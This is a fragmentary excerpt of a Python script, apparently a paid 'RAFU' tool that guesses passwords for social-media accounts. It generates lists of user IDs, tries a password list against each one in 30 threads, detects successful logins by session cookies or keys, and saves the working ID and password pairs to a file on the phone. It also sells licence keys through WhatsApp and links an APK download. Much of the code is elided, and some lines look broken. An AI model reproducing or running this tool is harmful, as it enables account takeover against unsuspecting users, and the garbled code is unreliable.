...
logo=("""\033[1;37m
 ...
 |  |   ||    \         |    \  /    ||     ||  |  |
 | _   _ ||  D  )        |  D  )|  o  ||   __||  |  | \033[1;34m𝐏 \033[1;37m
 |  \_/  ||    /         |    / |     ||  |_  |  |  |\033[1;31m 𝐑\033[1;37m
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/RAFU_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801982876336&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi RAFU Sir, I Need To Buy Your Paid RAFU PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python RAFU.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as RAFU:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [RAFU-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        RAFU=session.cookies.get_dict().keys()
                        if "c_user" in Rafu:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [RAFU-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcardRAFU-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/RAFU-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [RAFU-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/RAFU-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [RAFU-OK] '+uid+' | '+pas+'\033[1;97m')
